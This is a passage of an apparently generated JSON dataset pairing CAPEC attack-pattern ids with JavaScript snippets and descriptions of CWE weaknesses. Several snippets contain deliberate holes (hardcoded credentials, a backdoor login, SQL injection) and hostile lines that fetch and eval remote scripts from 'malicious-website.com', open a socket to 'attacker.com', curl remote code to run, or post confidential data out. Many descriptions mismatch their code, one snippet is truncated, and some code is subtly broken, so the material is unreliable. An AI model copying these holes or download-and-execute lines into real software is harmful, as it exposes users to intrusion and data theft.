        "description": "This code snippet demonstrates a reflection attack in an authentication protocol (CWE-301) and observable behavioral discrepancy (CWE-205, CWE-207) in a login system. The authenticate function checks the username and password, and the reflectAttack function can be used to impersonate a trusted user. The login function exhibits different behavior for admin and users, which can be observed by an attacker. The code relies on a single factor (password) in a security decision (CWE-654), making it vulnerable to attacks."
    },
    {
        "capec_id": "425",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\napp.use(express.json());\n\nconst options = {\n  key: fs.readFileSync('server-key.pem'),\n  cert: fs.readFileSync('server-cert.pem')\n};\n\nconst server = https.createServer(options, app);\n\napp.post('/api/data', (req, res) => {\n  const userInput = req.body;\n  const framedResponse = {\n    'message': 'We noticed you have not opted-in to our premium service.',\n    'buttonText': 'Learn More'\n  };\n  res.json(framedResponse);\n});\n\nserver.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that uses framing techniques to influence user decisions. The server uses a single factor (user input) to make a security decision, without properly verifying the user's identity (CWE-654). The user interface misrepresents critical information by using a positive tone and avoiding the word 'No' (CWE-451). The server also uses a less-secure algorithm for encryption (CWE-757) and does not adequately verify the identity of actors at both ends of the communication channel (CWE-300). Additionally, the server does not correctly specify the intended destination for the outgoing request (CWE-941)."
    },
    {
        "capec_id": "426",
        "code_snippet": "const userIncentives = {\n  'financial': 0.8,\n  'social': 0.4,\n  'ideological': 0.6\n};\n\nfunction manipulateUser(user, incentiveType, incentiveValue) {\n  if (user.incentiveType === incentiveType) {\n    user.incentiveValue += incentiveValue;\n    if (user.incentiveValue > 1) {\n      // Create emergent resource (CWE-1229)\n      const emergentResource = createResource(user);\n      return emergentResource;\n    }\n  }\n  return null;\n}\n\nfunction createResource(user) {\n  // Asymmetric resource consumption (CWE-405)\n  const resource = {\n    'type': 'emergent',\n    'value': user.incentiveValue * 10\n  };\n  return resource;\n}\n\nfunction communicateWithActor(actor, resource) {\n  // Incorrectly specify destination in communication channel (CWE-941)\n  const channel = createChannel(actor);\n  channel.send(resource);\n}\n\nfunction createChannel(actor) {\n  // Reliance on security through obscurity (CWE-656)\n  const channel = {\n    'type': 'obscure',\n    'key': 'secretKey'\n  };\n  return channel;\n}\n\nfunction makeSecurityDecision(user, resource) {\n  // Reliance on a single factor in a security decision (CWE-654)\n  if (user.incentiveValue > 0.5) {\n    return true;\n  }\n  return false;\n}",
        "description": "This code snippet demonstrates the CAPEC of manipulating a user's behavior through incentivization. It uses various CWEs to create emergent resources, consume asymmetric resources, incorrectly specify communication channels, rely on security through obscurity, and make security decisions based on a single factor. The code creates a user object with incentives, manipulates the user's behavior based on the incentives, creates emergent resources, and communicates with an actor through an insecure channel. The security decision is made based on a single factor, making it vulnerable to exploitation."
    },
    {
        "capec_id": "427",
        "code_snippet": "const auth = (username, password) => {\n  if (username === 'admin' && password === 'password123') {\n    return { authenticated: true, role: 'admin' };\n  } else {\n    return { authenticated: false, reason: 'Invalid credentials' };\n  }\n};\n\nconst login = (username, password) => {\n  const response = auth(username, password);\n  if (response.authenticated) {\n    // Grant access to restricted resources\n    console.log('Welcome, ' + response.role);\n  } else {\n    // Truncate security-relevant information\n    console.log(response.reason);\n  }\n};\n\n// External influence of sphere definition\nconst sphereDefinition = {\n  'admin': ['access_to_all_resources']\n};\n\n// Observable behavioral discrepancy\nconst observeBehavior = (user) => {\n  if (user === 'admin') {\n    return 'privileged_user';\n  } else {\n    return 'standard_user';\n  }\n};\n\n// Reliance on a single factor in a security decision\nconst singleFactorAuth = (username) => {\n  if (username === 'admin') {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// Reflection attack in an authentication protocol\nconst reflectAttack = (username, password) => {\n  const reflectedUsername = username;\n  const reflectedPassword = password;\n  return auth(reflectedUsername, reflectedPassword);\n};",
        "description": "This code snippet demonstrates a vulnerable authentication system that embodies the CAPEC idea of influencing a target's actions or behavior through psychological manipulation. The code includes vulnerabilities related to observable behavioral discrepancy, external influence of sphere definition, reliance on a single factor in a security decision, and reflection attack in an authentication protocol. The authentication function is simplistic and can be easily bypassed, and the system truncates security-relevant information, making it vulnerable to attacks."
    },
    {
        "capec_id": "428",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/api/data', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  const language = req.headers['accept-language'];\n  const ip = req.ip;\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // No verification of the request origin or integrity\n  const trustedUser = req.body.trustedUser;\n  if (trustedUser) {\n    // CWE-1229: Creation of Emergent Resource\n    // Create a new resource (session) without proper validation\n    const session = createSession(ip, userAgent, language);\n    res.json({ session: session });\n  } else {\n    res.status(401).json({ error: 'Unauthorized' });\n  }\n});\n\n// CWE-222: Truncation of Security-relevant Information\nfunction createSession(ip, userAgent, language) {\n  const truncatedIp = ip.substring(0, 10); // truncate IP address\n  const session = { ip: truncatedIp, userAgent: userAgent, language: language };\n  return session;\n}\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nfunction authenticateUser(session) {\n  const trustedUser = session.trustedUser;\n  if (trustedUser) {\n    // Simple authentication protocol, vulnerable to reflection attacks\n    return true;\n  } else {\n    return false;\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable server-side application that adapts to the target's language and thought patterns, building rapport and potentially manipulating the target into sharing information. The code is vulnerable to multiple CWEs, including Channel Accessible by Non-Endpoint, Improper Verification of Source of a Communication Channel, Creation of Emergent Resource, Truncation of Security-relevant Information, and Reflection Attack in an Authentication Protocol."
    },
    {
        "capec_id": "429",
        "code_snippet": "const eyeTracking = (userInput) => {\n  let gazeDuration = 0;\n  let gazeLocation = \\",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an eye-tracking system that sends user's gaze information to a server. The code uses a CAPTCHA challenge to verify the user's response, but the challenge is guessable due to a weak generation algorithm. The code also displays the user's response to the CAPTCHA challenge, which can be observed by an unauthorized actor, revealing security-relevant information. The code is vulnerable to CWE-205 (Observable Behavioral Discrepancy), CWE-222 (Truncation of Security-relevant Information), CWE-203 (Observable Discrepancy), CWE-451 (User Interface (UI) Misrepresentation of Critical Information), and CWE-804 (Guessable CAPTCHA)."
    },
    {
        "capec_id": "430",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst debug = require('debug')('myapp');\n\napp.get('/', (req, res) => {\n  const sensitiveData = 'secretKey';\n  debug(sensitiveData);\n  res.send('Hello World!');\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that exposes sensitive information through debug log files (CWE-534) and server log files (CWE-533). The 'debug' module is used to log sensitive data, which can be accessed by an attacker. Additionally, the server's attack surface is increased due to the use of unnecessary modules and features (CWE-1125). The code also potentially exposes sensitive information during transient execution (CWE-1420) and information exposure through microarchitectural state after transient execution (CWE-1342)."
    },
    {
        "capec_id": "431",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/user', (req, res) => {\n  const userInput = req.query.name;\n  const template = `<h1>Hello, ${userInput}!</h1>`;\n  res.send(template);\n});\n\napp.use((err, req, res, next) => {\n  const errorMessage = `Error: ${err.message} - ${err.stack}`;\n  res.status(500).send(errorMessage);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that embodies the main idea of the deprecated CAPEC. It uses Express.js to create a web application that takes user input and inserts it into a template without proper validation or neutralization, making it vulnerable to CWE-1286 (Improper Validation of Syntactic Correctness of Input) and CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine). The error handling mechanism also discloses sensitive information about the environment, making it vulnerable to CWE-209 (Generation of Error Message Containing Sensitive Information). The excessive attack surface and lack of input validation also make it vulnerable to CWE-1125 (Excessive Attack Surface) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) respectively."
    },
    {
        "capec_id": "432",
        "code_snippet": "const userInput = '\" OR 1=1 --';\nconst query = `SELECT * FROM users WHERE name = ${userInput};`;\nconsole.log(query);\n\nconst fs = require('fs');\nconst logFile = fs.readFileSync('log.txt', 'utf8');\nconst logLines = logFile.split('\\n');\nfor(let i = 0; i < logLines.length; i++) {\n    const logLine = logLines[i];\n    if(logLine.includes('password')) {\n        console.log(logLine);\n    }\n}\n\nconst captcha = 'What is 2 + 2?';\nconst userInputCaptcha = '4';\nif(userInputCaptcha === captcha) {\n    console.log('CAPTCHA is correct!');\n} else {\n    console.log('CAPTCHA is incorrect.');\n}",
        "description": "This code snippet demonstrates the CAPEC pattern of improper neutralization of quoting syntax, which can lead to SQL injection and information exposure. The userInput variable is injected with malicious input that can compromise the system. The code also reads a log file and prints lines that contain the word 'password', which is an example of information exposure through log files. Finally, the code includes a simple CAPTCHA challenge that can be easily guessed."
    },
    {
        "capec_id": "433",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input;\n  const buffer = Buffer.alloc(10);\n  buffer.write(userInput, 0);\n  const data = buffer.toString('utf8');\n  res.send(data);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript server that is susceptible to buffer overflow attacks. The server receives user input and writes it to a buffer without checking the size of the input, leading to a classic buffer overflow (CWE-120). The buffer is then converted to a string and sent back to the user, potentially allowing an attacker to inject malicious data. Additionally, the server transmits sensitive data in cleartext (CWE-319) and does not ensure the integrity of the message during transmission (CWE-924). The code also accesses memory outside of the intended boundary of the buffer (CWE-119) and uses the size of the source buffer when reading from or writing to a destination buffer (CWE-806)."
    },
    {
        "capec_id": "434",
        "code_snippet": "const sensitiveData = {\n  'userCount': 100,\n  'adminCount': 5,\n  'totalRevenue': 10000\n};\n\nfunction getStatistics(query) {\n  if (query === 'userCount') {\n    return sensitiveData.userCount;\n  } else if (query === 'adminCount') {\n    return sensitiveData.adminCount;\n  } else if (query === 'totalRevenue') {\n    return sensitiveData.totalRevenue;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// CAPTCHA implementation with a guessable pattern\nfunction generateCaptcha() {\n  const captcha = Math.floor(Math.random() * 10);\n  return captcha;\n}\n\n// Incompatible policies: exposing sensitive information to certain actors\nfunction checkAccess(actor, query) {\n  if (actor === 'admin') {\n    return getStatistics(query);\n  } else if (actor === 'user') {\n    if (query === 'userCount') {\n      return getStatistics(query);\n    } else {\n      return 'Access denied';\n    }\n  } else {\n    return 'Invalid actor';\n  }\n}\n\n// Missing source correlation: relying on a single data source\nfunction getRevenue() {\n  return sensitiveData.totalRevenue;\n}",
        "description": "This code snippet demonstrates the CAPEC 'Exposure of Sensitive Information Through Data Queries' by allowing an attacker to infer sensitive information through statistics. The getStatistics function returns sensitive data based on the query, and the checkAccess function implements incompatible policies by exposing sensitive information to certain actors. The generateCaptcha function has a guessable pattern, making it vulnerable to automated recognition. Finally, the getRevenue function relies on a single data source, making it vulnerable to data source compromise."
    },
    {
        "capec_id": "435",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/api/data', (req, res) => {\n  const origin = req.get('Origin');\n  if (origin === 'http://trusted-origin.com') {\n    // Verify the origin, but do not validate the request content\n    const data = req.body;\n    processRequest(data);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nfunction processRequest(data) {\n  // Send the request to an external service without validating the destination\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://external-service.com/api/endpoint', true);\n  xhr.send(JSON.stringify(data));\n}",
        "description": "This code snippet demonstrates the CAPEC 'Channel Accessible by Non-Endpoint' by not adequately verifying the identity of actors at both ends of a communication channel. It allows an actor that is not an endpoint to access or influence the channel. Specifically, it does not properly validate the request content and destination, making it vulnerable to CWE-941 'Incorrectly Specified Destination in a Communication Channel' and CWE-940 'Improper Verification of Source of a Communication Channel'. Additionally, it may reveal internal state or decision process, which is related to CWE-205 'Observable Behavioral Discrepancy'."
    },
    {
        "capec_id": "438",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // Backdoor code to send confidential information to OSAT vendors\n    const xhr = new XMLHttpRequest();\n    xhr.open('POST', 'https://osat-vendor.com/collectData', true);\n    xhr.send('confidentialInfo=' + getConfidentialInfo());\n  },\n  update: function() {\n    // Non-updateable component, always returns false\n    return false;\n  }\n};\n\nconst product = {\n  init: function() {\n    // Using insufficiently trusted component\n    maliciousComponent.init();\n  },\n  getConfig: function() {\n    // Insufficient technical documentation, returns incomplete configuration\n    return {\n      'version': '1.0',\n      'releaseType': 'pre-production'\n    };\n  }\n};\n\nproduct.init();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of modifying a technology during its manufacture to carry out an attack. It includes CWEs such as reliance on an insufficiently trusted component (CWE-1357), unprotected confidential information accessible by OSAT vendors (CWE-1297), product released in non-release configuration (CWE-1269), insufficient technical documentation (CWE-1059), and reliance on a non-updateable component (CWE-1329). The malicious component sends confidential information to OSAT vendors and is non-updateable. The product uses this component and lacks sufficient technical documentation, making it vulnerable to attacks."
    },
    {
        "capec_id": "439",
        "code_snippet": "const thirdPartyComponent = require('vulnerable-library');\n\n// Release in non-release configuration\nprocess.env.NODE_ENV = 'development';\n\n// Expose sensitive information\nconst apiKey = 'SECRET_API_KEY';\nconsole.log(apiKey);\n\n// Use vulnerable third-party component\nthirdPartyComponent.doSomething();\n\n// Reliance on insufficiently trustworthy component\nconst untrustedComponent = require('untrusted-library');\nuntrustedComponent.doSomethingElse();\n\n// Observable behavioral discrepancy\nif (process.env.NODE_ENV === 'development') {\n  console.log('This is a development environment');\n} else {\n  console.log('This is a production environment');\n}",
        "description": "This code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. It includes multiple CWEs, including releasing in non-release configuration, exposing sensitive information, using a vulnerable third-party component, relying on an insufficiently trustworthy component, and observable behavioral discrepancy."
    },
    {
        "capec_id": "440",
        "code_snippet": "const firmwareUpdater = {\n  version: '1.0.0',\n  updateFirmware: function(newVersion) {\n    if (newVersion < this.version) {\n      // CWE-1328: Security Version Number Mutable to Older Versions\n      console.log('Downgrading firmware to version ' + newVersion);\n      this.version = newVersion;\n      // CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n      // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n      // Simulate hardware defects/glitches\n      if (Math.random() < 0.5) {\n        console.log('Hardware defect/glitch detected. System compromised.');\n      }\n    } else {\n      console.log('Firmware update successful.');\n    }\n  },\n  injectError: function() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Injecting error into redundant block...');\n    // Simulate error injection\n    throw new Error('Redundancy compromised.');\n  }\n};\n\n// CWE-1329: Reliance on Component That is Not Updateable\nconst nonUpdateableComponent = {\n  doSomething: function() {\n    console.log('Non-updateable component doing something...');\n  }\n};\n\nfirmwareUpdater.updateFirmware('0.9.0');\nfirmwareUpdater.injectError();\nnonUpdateableComponent.doSomething();",
        "description": "This code snippet demonstrates a firmware updater that can be downgraded to an older version, allowing an attacker to exploit known vulnerabilities. The updater also contains a function to inject errors into a redundant block, which can compromise system redundancy. Additionally, the code includes a non-updateable component that can be exploited by an attacker. The code simulates hardware defects and glitches, which can further compromise system security."
    },
    {
        "capec_id": "441",
        "code_snippet": "const maliciousFirmware = {\n  update: function() {\n    // CWE-506: Embedded Malicious Code\n    const virus = new MaliciousCode();\n    virus.replicate();\n  },\n  accessControl: function() {\n    // CWE-284: Improper Access Control\n    return {\n      isAdmin: true\n    };\n  },\n  replicate: function() {\n    // CWE-509: Replicating Malicious Code (Virus or Worm)\n    const worm = new Worm();\n    worm.spread();\n  }\n};\n\nconst projector = {\n  firmware: maliciousFirmware,\n  updateFirmware: function() {\n    // CWE-1277: Firmware Not Updateable\n    console.log('Firmware cannot be updated.');\n  },\n  createResource: function() {\n    // CWE-1229: Creation of Emergent Resource\n    const emergentResource = new Resource();\n    emergentResource.grantAccess();\n  }\n};",
        "description": "This code snippet demonstrates a malicious firmware update for a digital projector. The firmware contains embedded malicious code (CWE-506) that replicates itself (CWE-509) and grants improper access control (CWE-284). The projector's firmware is not updateable (CWE-1277), allowing the malicious code to persist. Additionally, the code creates an emergent resource (CWE-1229) that can be exploited by attackers."
    },
    {
        "capec_id": "442",
        "code_snippet": "const maliciousCode = `const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious-script.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousScript = xhr.responseText; eval(maliciousScript); } }; xhr.send();`; const benignSoftware = `function usefulFunction() { console.log('This is a useful function.'); }`; const TrojanHorse = `(${benignSoftware})(); (${maliciousCode})();`; eval(TrojanHorse);",
        "description": "This JavaScript code snippet demonstrates the CAPEC pattern of adding malicious logic to benign software. The benign software is a useful function that logs a message to the console. The malicious code is downloaded from a remote location without integrity checks (CWE-494) and executed using eval(). The malicious code is hidden from the user and works behind the scenes to achieve negative impacts. The code also exhibits characteristics of a Trojan Horse (CWE-507) as it appears to be benign but contains malicious code. The malicious code does not replicate itself, making it an example of non-replicating malicious code (CWE-508)."
    },
    {
        "capec_id": "443",
        "code_snippet": "const adminPrivileges = true;\n\nif (adminPrivileges) {\n  const maliciousCode = `const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious-script.js', true); xhr.onload = function() { if (xhr.status === 200) { eval(xhr.responseText); } }; xhr.send();`;\n  const innocentScript = 'console.log(\\'Hello, World!\\');';\n  const combinedScript = `${innocentScript} ${maliciousCode}`;\n  eval(combinedScript);\n}\n\n// Insecure inherited permissions\nconst userRole = 'admin';\nconst permissions = {\n  'admin': ['create', 'read', 'update', 'delete'],\n  'user': ['read']\n};\nconst userPermissions = permissions[userRole];\n\n// Lack of administrator control over security\nconst securitySettings = {\n  'strictMode': false,\n  'integrityCheck': false\n};\n\nif (!securitySettings.strictMode) {\n  const unverifiedScript = 'const xhr = new XMLHttpRequest(); xhr.open(\\'GET\\', \\'https://untrusted-website.com/unverified-script.js\\', true); xhr.onload = function() { if (xhr.status === 200) { eval(xhr.responseText); } }; xhr.send();';\n  eval(unverifiedScript);\n}",
        "description": "This code snippet demonstrates the CAPEC of an adversary using their privileged position to inject malicious logic into a codebase. It uses CWE-506 by embedding malicious code within an innocent script, CWE-1229 by creating emergent resources through the use of eval(), CWE-277 by inheriting insecure permissions, CWE-494 by downloading code without integrity checks, and CWE-671 by lacking administrator control over security settings."
    },
    {
        "capec_id": "444",
        "code_snippet": "function sensitiveOperation() {\n  var secretKey = 'my_secret_key';\n  var encryptedData = encryptData(secretKey);\n  // Compiler optimization may remove or modify the following security-critical code\n  if (checkAuthorization()) {\n    // Processor optimization may remove or modify the following security-critical code\n    var decryptedData = decryptData(encryptedData, secretKey);\n    // Embedded malicious code may expose sensitive system information\n    var systemInfo = getSystemInformation();\n    // Improper control of dynamically-managed code resources may allow unauthorized access\n    eval(decryptedData);\n  }\n}\n\nfunction encryptData(key) {\n  // Malicious code may be embedded here\n  return 'encrypted_data';\n}\n\nfunction decryptData(data, key) {\n  // Malicious code may be embedded here\n  return 'decrypted_data';\n}\n\nfunction getSystemInformation() {\n  // Sensitive system information may be exposed here\n  return 'system_info';\n}",
        "description": "This code snippet demonstrates a development alteration attack where an adversary modifies the code during development to achieve a negative impact when the system is deployed. The code includes security-critical mechanisms that may be removed or modified by compiler or processor optimizations, embedded malicious code, exposure of sensitive system information, and improper control of dynamically-managed code resources."
    },
    {
        "capec_id": "445",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('childProcess');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'const net = require(\\'net\\'); const client = new net.Socket(); client.connect(8080, \\'attacker.com\\', function() { console.log(\\'Connected to attacker\\'); });';\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst dynamicCode = `const x = 1; ${maliciousCode}`;\n\n// CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\nfunction nonReentrantCode() {\n  eval(dynamicCode);\n  nonReentrantCode();\n}\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('http://untrusted.com/malicious-library');\n\n// CWE-494: Download of Code Without Integrity Check\nconst updateCode = childProcess.execSync('curl http://untrusted.com/update.js').toString();\nfs.writeFileSync('update.js', updateCode);\nrequire('./update');\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting a configuration management system to insert malicious logic into a software product's build, update, or deployment environment. It includes multiple CWEs, such as embedded malicious code, improper control of dynamically-managed code resources, unintended reentrant invocation of non-reentrant code, inclusion of functionality from an untrusted control sphere, and download of code without integrity check."
    },
    {
        "capec_id": "446",
        "code_snippet": "const maliciousLibrary = require('vulnerable-third-party-lib');\n\nfunction processUserInput(input) {\n  const untrustedComponent = require('untrusted-control-sphere-lib');\n  const result = untrustedComponent.process(input);\n  return maliciousLibrary.parse(result);\n}\n\nmodule.exports = processUserInput;",
        "description": "This code snippet demonstrates a supply chain attack by including insecure third-party components. The 'vulnerable-third-party-lib' library is known to have vulnerabilities, and the 'untrusted-control-sphere-lib' component is from an untrusted source. The code imports and uses these components, potentially leading to malicious code execution."
    },
    {
        "capec_id": "447",
        "code_snippet": "const sensitiveInfo = {\n  'apiKey': 'my_secret_api_key',\n  'adminPassword': 'my_secret_admin_password'\n};\n\nfunction optimizeCode(code) {\n  // Compiler optimization removal or modification of security-critical code (CWE-733)\n  return code.replace('if (isAdmin) {', 'if (true) {');\n}\n\nfunction enforceSecurity() {\n  // Client-Side Enforcement of Server-Side Security (CWE-602)\n  if (isAdmin) {\n    // Violation of Secure Design Principles (CWE-657)\n    return sensitiveInfo;\n  }\n}\n\nconst optimizedCode = optimizeCode(enforceSecurity.toString());\n\n// Evaluate the optimized code, allowing unauthorized access to sensitive system information (CWE-497)\neval(optimizedCode);",
        "description": "This code snippet demonstrates a design alteration attack, where an adversary modifies the design of a system prior to development. The code includes several vulnerabilities, including compiler optimization removal or modification of security-critical code (CWE-733), client-side enforcement of server-side security (CWE-602), and violation of secure design principles (CWE-657). The optimized code is then evaluated, allowing unauthorized access to sensitive system information (CWE-497)."
    },
    {
        "capec_id": "448",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nlet dllPath = process.env.PATH.split(path.delimiter);\nlet maliciousDll = 'malicious.dll';\n\n// CWE-506: Embedded Malicious Code\nlet virusCode = 'const WScriptShell = new ActiveXObject(\"WScript.Shell\"); WScriptShell.Run(\"calc.exe\");';\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nlet padding = new Array(1024).fill(0);\nlet virusBytes = new TextEncoder().encode(virusCode);\nlet paddedBytes = new Uint8Array(padding.length + virusBytes.length);\npaddedBytes.set(padding, 0);\npaddedBytes.set(virusBytes, padding.length);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlet systemInfo = process.env;\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nfunction infectSystem() {\n  fs.writeFileSync(maliciousDll, paddedBytes);\n  dllPath.unshift(path.resolve(maliciousDll));\n  process.env.PATH = dllPath.join(path.delimiter);\n  console.log('System infected!');\n}\n\ninfectSystem();",
        "description": "This code snippet demonstrates the CAPEC by tampering with a DLL and embedding a virus into gaps between legitimate machine instructions. The virus attempts to infect any machine that interfaces with the product, steal private data, or eavesdrop. The code uses an untrusted search path to locate the malicious DLL, relies on machine-dependent data representation to pad the virus code, and exposes sensitive system information to an unauthorized control sphere. Finally, the code replicates the malicious code to infect other systems."
    },
    {
        "capec_id": "449",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction updateFirmware(firmwarePath) {\n  if (path.basename(firmwarePath) === 'AUX' || path.basename(firmwarePath) === 'CON') {\n    // Improper Handling of Windows Device Names (CWE-67)\n    console.log('Updating firmware...');\n    fs.writeFileSync(firmwarePath, 'Malicious code injected!');\n  } else {\n    // Firmware Not Updateable (CWE-1277)\n    console.log('Firmware update not supported.');\n  }\n}\n\n// Embedded Malicious Code (CWE-506)\nfunction maliciousCode() {\n  const api = require('nonUbiquitousAPI');\n  api.doSomethingMalicious();\n}\n\n// Trojan Horse (CWE-507)\nfunction benignFunctionality() {\n  console.log('Benign functionality executed.');\n  maliciousCode();\n}\n\nbenignFunctionality();",
        "description": "This JavaScript code snippet demonstrates a deprecated CAPEC pattern, which is a duplicate of CAPEC-448: Malware Infection into Product Software. It includes CWE-507: Trojan Horse, CWE-506: Embedded Malicious Code, CWE-589: Call to Non-ubiquitous API, CWE-67: Improper Handling of Windows Device Names, and CWE-1277: Firmware Not Updateable. The code appears to provide benign functionality but hides malicious code that can cause harm to the system."
    },
    {
        "capec_id": "450",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadDLL(dllPath) {\n  try {\n    const dllContent = fs.readFileSync(dllPath);\n    const dllModule = requireFromString(dllContent);\n    return dllModule;\n  } catch (e) {\n    console.error(`Error loading DLL: ${e}`);\n  }\n}\n\nfunction requireFromString(src) {\n  const m = { exports: {} };\n  const r = require;\n  const module = { exports: m.exports, id: 'dll' };\n  const fn = new Function('require', 'module', 'exports', src);\n  fn(r, module, m.exports);\n  return m.exports;\n}\n\n// Load a DLL from an untrusted search path\nconst dllPath = 'C:\\\\Windows\\\\System32\\\\AUX\\\\malicious.dll';\nconst maliciousDLL = loadDLL(dllPath);\n\n// Execute the malicious code\nmaliciousDLL.doSomethingEvil();",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that loads a DLL from an untrusted search path, which can lead to the execution of malicious code. The code uses the 'fs' and 'path' modules to read the DLL content and load it as a module. The 'requireFromString' function is used to execute the DLL code, which can contain malicious functionality. The code then executes the malicious code by calling the 'doSomethingEvil' function. This code snippet embodies the main idea of the CAPEC, which is to embed a virus into a DLL, and relates to CWEs 507, 506, 426, 67, and 509."
    },
    {
        "capec_id": "451",
        "code_snippet": "const dns = require('dns');\n\nfunction checkDomain(domain) {\n  dns.lookup(domain, (err, address, family) => {\n    if (err) {\n      // CWE-247: Reliance on DNS Lookups in a Security Decision\n      // CWE-589: Call to Non-ubiquitous API\n      if (process.platform === 'win32') {\n        const api = require('win32-api');\n        api.someNonUbiquitousFunction();\n      } else {\n        console.log('Unsupported platform');\n      }\n    } else {\n      // CWE-1277: Firmware Not Updateable\n      const firmwareUpdater = require('firmware-updater');\n      firmwareUpdater.updateFirmware();\n    }\n  });\n}\n\n// CWE-592: Authentication Bypass Issues\n// CWE-507: Trojan Horse\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password === 'password') {\n    return true;\n  } else {\n    // Hidden backdoor\n    if (username === 'backdoor' && password === 'secret') {\n      return true;\n    } else {\n      return false;\n    }\n  }\n}\n",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern that has been replaced by CAPEC-448: Malware Infection into Product Software. It includes various CWEs such as CWE-247 (Reliance on DNS Lookups in a Security Decision), CWE-589 (Call to Non-ubiquitous API), CWE-1277 (Firmware Not Updateable), CWE-592 (Authentication Bypass Issues), and CWE-507 (Trojan Horse). The code uses DNS lookups for security decisions, calls non-ubiquitous APIs, lacks firmware update capabilities, and contains hidden backdoor authentication."
    },
    {
        "capec_id": "452",
        "code_snippet": "const maliciousCode = `function replicateAndAttack() {\n  // CWE-509: Replicating malicious code\n  const worm = new Function('console.log(\\'Spreading malware...\\');');\n  worm();\n\n  // CWE-506: Embedded malicious code\n  const rootkit = new Function('console.log(\\'Hiding malicious activity...\\');');\n  rootkit();\n\n  // CWE-1247: Improper protection against voltage and clock glitches\n  const glitchExploit = () => {\n    const voltageGlitch = 0.5;\n    const clockGlitch = 1000;\n    // Simulate voltage and clock glitches\n    console.log(`Voltage glitch: ${voltageGlitch}, Clock glitch: ${clockGlitch}`);\n  };\n  glitchExploit();\n\n  // CWE-1313: Hardware allows activation of test or debug logic at runtime\n  const debugLogic = () => {\n    const testFeature = true;\n    if (testFeature) {\n      console.log('Activating test or debug logic...');\n      // Alter system behavior and leak sensitive data\n      console.log('Altered system behavior and leaked sensitive data!');\n    }\n  };\n  debugLogic();\n\n  // CWE-1262: Improper access control for register interface\n  const registerInterface = () => {\n    const memoryMappedIO = {\n      read: () => {\n        return 'Sensitive data';\n      },\n      write: (data) => {\n        console.log(`Writing data to register: ${data}`);\n      }\n    };\n    memoryMappedIO.write('Malicious data');\n  };\n  registerInterface();\n}\nreplicateAndAttack();`;",
        "description": "This JavaScript code snippet demonstrates the CAPEC pattern of inserting malicious logic into hardware. It includes examples of CWE-506 (embedded malicious code), CWE-509 (replicating malicious code), CWE-1247 (improper protection against voltage and clock glitches), CWE-1313 (hardware allows activation of test or debug logic at runtime), and CWE-1262 (improper access control for register interface). The code simulates a malicious attack on a system, including spreading malware, hiding malicious activity, exploiting voltage and clock glitches, altering system behavior, and leaking sensitive data."
    },
    {
        "capec_id": "453",
